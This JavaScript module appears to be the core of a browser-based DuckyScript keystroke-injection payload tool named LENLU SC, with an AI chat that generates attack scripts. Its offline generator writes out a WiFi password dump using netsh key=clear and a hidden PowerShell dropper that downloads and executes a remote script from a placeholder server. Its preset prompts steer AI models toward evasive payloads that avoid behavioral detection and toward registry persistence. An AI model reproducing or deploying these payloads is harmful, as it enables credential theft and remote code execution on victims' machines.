import { S, BOOT } from './state.js';
import { initDatabase } from './db.js';
import './ui.js';
import './compiler.js';
import './network.js';
import './crypto.js';
import './compliance.js';
import './shell.js';
import './vault.js';
import './forge-extensions.js';
    function runBoot() {
      const log = document.getElementById('spLog');
      const fill = document.getElementById('spFill');
      const status = document.getElementById('spStatus');
      const btn = document.getElementById('bootBtn');
      BOOT.forEach((m, i) => {
        setTimeout(() => {
          const d = document.createElement('div');
          d.className = m.c; d.textContent = m.t;
          log.appendChild(d); log.scrollTop = log.scrollHeight;
          fill.style.width = ((i + 1) / BOOT.length * 100) + '%';
          status.textContent = m.t.replace(/\[.*?\]\s*/, '').toUpperCase();
        }, m.d);
      });
      setTimeout(() => { status.textContent = 'ALL SYSTEMS ONLINE — READY TO ENTER FORGE'; btn.style.display = 'block'; }, 2950);
    }

    function bootEnter() {
      localStorage.setItem('lenlu_booted4', '1');
      document.getElementById('splash').classList.add('hidden');
      document.getElementById('app').classList.add('visible');
      initApp();
    }
    async function initApp() {
      await initDatabase();
      startMatrixRain(); startBGCanvas(); startNavClock();
      buildDuckRef(); loadSettings(); checkBLE(); checkWebGL();
      initTelemetry(); initShell(); initRevealObserver(); initHeroCanvas();
      loadAIConfig(); buildAITags(); renderVault(); renderHistory();
      document.getElementById('sessionId').textContent = S.sessionId;
      document.getElementById('homeSessionId').textContent = S.sessionId;
      const initialView = (location.hash || '#home').replace('#', '').trim() || 'home';
      if (document.getElementById('view-' + initialView)) switchView(initialView, document.querySelector('[data-view=' + initialView + ']'));
      const src = localStorage.getItem('lenlu_src4');
      if (src && getSetting('persist')) { document.getElementById('srcEditor').value = src; lintSource(src); }
      document.addEventListener('keydown', e => {
        if (e.ctrlKey && e.key === 'Enter') { e.preventDefault(); compilePayload(); }
        else if (e.ctrlKey && e.key === 's') { e.preventDefault(); saveToVault(); }
        else if (e.ctrlKey && e.key === 'l') { clearLog(); }
        else if (e.ctrlKey && e.key === 'k') { e.preventDefault(); switchView('terminal', document.querySelector('[data-view=terminal]')); }
        else if (e.ctrlKey && e.shiftKey && e.key === 'E') { switchView('encoder', document.querySelector('[data-view=encoder]')); }
        else if (e.ctrlKey && e.shiftKey && e.key === 'N') { switchView('network', document.querySelector('[data-view=network]')); }
        else if (e.ctrlKey && e.shiftKey && e.key === 'K') { switchView('keymap', document.querySelector('[data-view=keymap]')); }
        else if (e.ctrlKey && e.shiftKey && e.key === 'O') { switchView('osint', document.querySelector('[data-view=osint]')); }
        else if (e.key === 'F1') { e.preventDefault(); switchView('dashboard', document.querySelector('[data-view=dashboard]')); }
      });
      setTimeout(() => { refreshNetworkInfo(); runOSINT(); startActivityFeed(); }, 900);
    }

    function switchView(id, btn) {
      if (!id) return;
      const target = document.getElementById('view-' + id);
      if (!target) return;
      S.currentView = id;
      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
      document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
      target.classList.add('active');
      const nextBtn = btn || document.querySelector('[data-view="' + id + '"]');
      if (nextBtn) {
        nextBtn.classList.add('active');
        nextBtn.scrollIntoView({ block: 'nearest', inline: 'center', behavior: 'smooth' });
      }
      const m = document.querySelector('.main'); if (m) m.scrollTo({ top: 0, behavior: 'smooth' });
      if (location.hash !== '#' + id) location.hash = id;
      playTone(880, 'sine', .07, .05);
    }

    window.addEventListener('hashchange', () => {
      const id = (location.hash || '#home').replace('#', '').trim() || 'home';
      if (id !== S.currentView && document.getElementById('view-' + id)) {
        switchView(id, document.querySelector('[data-view="' + id + '"]'));
      }
    });

    function initRevealObserver() {
      const obs = new IntersectionObserver(entries => { entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('in'); }); }, { threshold: .1 });
      document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
    }

    const AI_TAGS = ['Open Notepad', 'Run PowerShell', 'System Recon', 'Lock Screen', 'Shutdown Timer', 'Network Info', 'DuckyScript 3.0 Function', 'WiFi Profile List'];
    function buildAITags() {
      const el = document.getElementById('aiTagGrid'); if (!el) return;
      AI_TAGS.forEach(tag => { const btn = document.createElement('button'); btn.className = 'btn btn-ghost btn-xs'; btn.textContent = tag; btn.onclick = () => document.getElementById('chatInput').value = 'Generate DuckyScript for: ' + tag; el.appendChild(btn); });
    }
    function setAIPreset(type) {
      const sysEl = document.getElementById('aiSysPrompt');
      const delayEl = document.getElementById('aiDelay');
      if (!sysEl) return;
      if (type === 'stealth') {
        sysEl.value = "You are LENLU SC, a DuckyScript compiler expert. Generate optimized, evasive keystroke sequences. Insert delays between actions to ensure host OS processes key inputs without triggering behavioral warning flags. Output only DuckyScript code.";
        if (delayEl) delayEl.value = "250";
      } else if (type === 'troll') {
        sysEl.value = "You are LENLU SC. Generate harmless, hilarious pranks and screen lock scripts. Output only valid DuckyScript with comments.";
        if (delayEl) delayEl.value = "100";
      } else if (type === 'recon') {
        sysEl.value = "You are LENLU SC. Generate network configuration, routing table, and system profile gathering DuckyScript commands. Keep it short and compact. Output only DuckyScript.";
        if (delayEl) delayEl.value = "150";
      } else if (type === 'persistence') {
        sysEl.value = "You are LENLU SC. Generate registry Run key entries or task scheduler persistence scripts using DuckyScript. Output only DuckyScript code.";
        if (delayEl) delayEl.value = "200";
      }
      toast('Preset loaded: ' + type, 'info');
    }
    async function sendChat() {
      const input = document.getElementById('chatInput'); const msg = input?.value?.trim(); if (!msg) return;
      input.value = ''; appendMsg(msg, 'user');
      S.stats.ai++; document.getElementById('stat-ai').textContent = S.stats.ai;

      const cfg = JSON.parse(localStorage.getItem('lenlu_ai4') || '{}');
      const endpoint = cfg.endpoint || 'anthropic';

      let key = '';
      if (cfg.keys && cfg.keys[endpoint]) {
        key = cfg.keys[endpoint];
      } else if (cfg.key) {
        key = cfg.key;
      }

      if (!key) {
        const prompt = msg.toLowerCase();
        let payload = 'REM Generated by LENLU SC Local Synthesizer (OFFLINE MODE)\n';
        if (prompt.includes('notepad') || prompt.includes('note') || prompt.includes('write')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 800\nSTRING Hello from offline Neural Synthesis!\n';
        } else if (prompt.includes('calc') || prompt.includes('calculator')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING calc\nENTER\n';
        } else if (prompt.includes('lock') || prompt.includes('logoff') || prompt.includes('screen')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER\n';
        } else if (prompt.includes('shutdown') || prompt.includes('reboot') || prompt.includes('restart')) {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING shutdown /s /t 60\nENTER\n';
        } else if (prompt.includes('wifi') || prompt.includes('password') || prompt.includes('netsh')) {
          payload += 'REM Dump all WiFi profiles and clear keys\nDELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c netsh wlan show profiles > %TEMP%\\w.txt && for /f "tokens=2 delims=:" %a in (\'netsh wlan show profiles\') do netsh wlan show profile name="%a" key=clear >> %TEMP%\\w.txt\nENTER\n';
        } else if (prompt.includes('rickroll') || prompt.includes('troll') || prompt.includes('youtube')) {
          payload += 'REM Opening YouTube Rickroll\nDELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgXcQ\nENTER\n';
        } else if (prompt.includes('powershell') || prompt.includes('reverse shell') || prompt.includes('shell')) {
          payload += 'REM PowerShell Dropper and execution\nDELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -NoP -NonI -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://yourserver.com/payload.ps1\')"\nENTER\n';
        } else if (prompt.includes('system info') || prompt.includes('recon') || prompt.includes('gathering')) {
          payload += 'REM Gathering host information\nDELAY 1000\nGUI r\nDELAY 300\nSTRING cmd /c systeminfo > %TEMP%\\sysinfo.txt && ipconfig /all >> %TEMP%\\sysinfo.txt && notepad %TEMP%\\sysinfo.txt\nENTER\n';
        } else {
          payload += 'DELAY 1000\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 800\nSTRING LN: Unrecognized prompt. Defaulting to diagnostic text.\nSTRING Prompt was: ' + msg.replace(/\n/g, ' ') + '\nENTER\n';
        }
        appendMsg(`// OFFLINE MODE — Synthesized offline rule-based payload.\n// Objective: "${msg}"\n\n${payload}`, 'ai');
        return;
      }

      appendMsg('// Synthesizing payload…', 'ai', 'thinking');
      try {
        const sp = cfg.sysPrompt || 'You are LENLU SC, a DuckyScript assistant. Respond only with valid DuckyScript code and REM comments.';
        S.chatHistory.push({ role: 'user', content: msg });
        const headers = { 'Content-Type': 'application/json' }; let body, url, proc;

        if (endpoint === 'anthropic') {
          url = 'https://api.anthropic.com/v1/messages';
          headers['x-api-key'] = key;
          headers['anthropic-version'] = '2023-06-01';
          body = { model: cfg.model || 'claude-3-5-sonnet-latest', max_tokens: 1024, system: sp, messages: S.chatHistory };
          proc = d => d.content?.[0]?.text || 'No response';
        } else if (endpoint === 'groq') {
          url = 'https://api.groq.com/openai/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'llama-3.3-70b-versatile', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        } else if (endpoint === 'custom') {
          url = cfg.customEndpoint || 'http://localhost:1234/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'custom-model', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        } else {
          url = 'https://api.openai.com/v1/chat/completions';
          headers['Authorization'] = 'Bearer ' + key;
          body = { model: cfg.model || 'gpt-4o-mini', messages: [{ role: 'system', content: sp }, ...S.chatHistory] };
          proc = d => d.choices?.[0]?.message?.content || 'No response';
        }

        const resp = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
        const data = await resp.json();
        if (!resp.ok) throw new Error(data.error?.message || data.error || data.message || 'API error ' + resp.status);
        const reply = proc(data); S.chatHistory.push({ role: 'assistant', content: reply });
        removeThinkingMsg(); appendMsg(reply, 'ai');
        if (reply.includes('DELAY') || reply.includes('STRING')) { document.getElementById('srcEditor').value = reply; lintSource(reply); updateEditorCounts(); toast('AI response → compiler', 'info'); }
      } catch (e) {
        removeThinkingMsg();
        let errMsg = '// Error: ' + e.message;
        if (e.message === 'Failed to fetch' || e.message?.toLowerCase().includes('failed to fetch')) {
          errMsg += `\n//\n// 💡 Troubleshooting Connection Failure (CORS/Network):\n// - Direct browser requests to external AI APIs are blocked by browser security (CORS).\n// - FIX: Install a browser extension like "Allow CORS: Access-Control-Allow-Origin" and turn it ON, or use a custom gateway proxy.`;
        }
        appendMsg(errMsg, 'ai');
      }
    }

    function appendMsg(text, role, extra = '') {
      const c = document.getElementById('chatMessages'); if (!c) return;
      const div = document.createElement('div'); div.className = 'msg ' + role; if (extra) div.dataset.extra = extra;

      let html = `<div class="msg-bubble">${text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>')}</div>`;

      if (role === 'ai' && extra !== 'thinking') {
        html += `
          <div class="msg-actions" style="display:flex;gap:.35rem;margin-top:.42rem;margin-bottom:.42rem;">
            <button class="btn btn-ghost btn-xs btn-import"><i class="fas fa-file-import" style="margin-right:.25rem;"></i>Import to IDE</button>
            <button class="btn btn-ghost btn-xs btn-copy"><i class="fas fa-copy" style="margin-right:.25rem;"></i>Copy</button>
            <button class="btn btn-ghost btn-xs btn-download"><i class="fas fa-download" style="margin-right:.25rem;"></i>Download</button>
          </div>
        `;
      }

      html += `<div class="msg-meta">${role === 'user' ? 'YOU' : 'LENLU SC'} · ${new Date().toLocaleTimeString()}</div>`;
      div.innerHTML = html;

      if (role === 'ai' && extra !== 'thinking') {
        const importBtn = div.querySelector('.btn-import');
        if (importBtn) {
          importBtn.addEventListener('click', () => {
            document.getElementById('srcEditor').value = text.substring(text.indexOf('\n\n') + 2);
            lintSource(document.getElementById('srcEditor').value);
            updateEditorCounts();
            switchView('compiler', document.querySelector('[data-view=compiler]'));
            toast('Imported to IDE', 'ok');
          });
        }

        const copyBtn = div.querySelector('.btn-copy');
        if (copyBtn) {
          copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(text)
              .then(() => toast('Copied to clipboard', 'ok'))
              .catch(() => toast('Copy block by browser', 'err'));
          });
        }

        const downloadBtn = div.querySelector('.btn-download');
        if (downloadBtn) {
          downloadBtn.addEventListener('click', () => {
            downloadTxt(text, 'payload.ds');
          });
        }
      }

      c.appendChild(div); c.scrollTop = c.scrollHeight;
    }

    function removeThinkingMsg() { document.getElementById('chatMessages')?.querySelector('[data-extra="thinking"]')?.remove(); }
    function clearChat() { document.getElementById('chatMessages').innerHTML = ''; S.chatHistory = []; }

    let micActive = false;
    function toggleMic() {
      const btn = document.getElementById('micBtn'); const status = document.getElementById('micStatus');
      const wave = document.getElementById('micWave');
      if (!('webkitSpeechRecognition' in window || 'SpeechRecognition' in window)) { toast('Speech recognition not supported', 'err'); return; }
      if (micActive) {
        micActive = false; S.recognition?.stop();
        btn.style.borderColor = 'var(--g)'; btn.style.background = 'var(--g-dark)';
        status.textContent = 'Click to start dictation';
        if (wave) wave.classList.remove('active');
        return;
      }
      micActive = true; btn.style.borderColor = 'var(--red)'; btn.style.background = 'rgba(255,45,85,.15)';
      status.textContent = 'Listening…';
      if (wave) wave.classList.add('active');

      const SR = window.SpeechRecognition || window.webkitSpeechRecognition; S.recognition = new SR();
      S.recognition.continuous = true; S.recognition.onresult = e => { const t = e.results[e.results.length - 1][0].transcript; document.getElementById('micOutput').textContent += t + ' '; };
      S.recognition.onend = () => {
        micActive = false; btn.style.borderColor = 'var(--g)'; btn.style.background = 'var(--g-dark)';
        status.textContent = 'Click to start dictation';
        if (wave) wave.classList.remove('active');
      };
      S.recognition.start();
    }
    function sendMicToChat() { const t = document.getElementById('micOutput')?.textContent?.trim(); if (!t) return; document.getElementById('chatInput').value = t; sendChat(); }

// DOMContentLoaded listener
    window.addEventListener('DOMContentLoaded', () => { runBoot(); if (localStorage.getItem('lenlu_booted4') === '1') { document.getElementById('splash')?.classList.add('hidden'); document.getElementById('app')?.classList.add('visible'); initApp(); } });

// initApp patch
    // ─── INIT PATCH ───
    const _origInitApp = initApp;
    initApp = async function () {
      await _origInitApp();
      loadTheme();
      loadLayout();
      drawSpeedGauge(0);
      setInterval(updateSkeuNeedles, 500);
      initArchitectCanvas();
      runSubnetCalc();
      renderMitreGrid();
      runComplianceAudit();
    };

export { runBoot, bootEnter, initApp, switchView, initRevealObserver, buildAITags, setAIPreset, sendChat, appendMsg, removeThinkingMsg, clearChat, toggleMic, sendMicToChat };
window.runBoot = runBoot;
window.bootEnter = bootEnter;
window.initApp = initApp;
window.switchView = switchView;
window.initRevealObserver = initRevealObserver;
window.buildAITags = buildAITags;
window.setAIPreset = setAIPreset;
window.sendChat = sendChat;
window.clearChat = clearChat;
window.toggleMic = toggleMic;
window.sendMicToChat = sendMicToChat;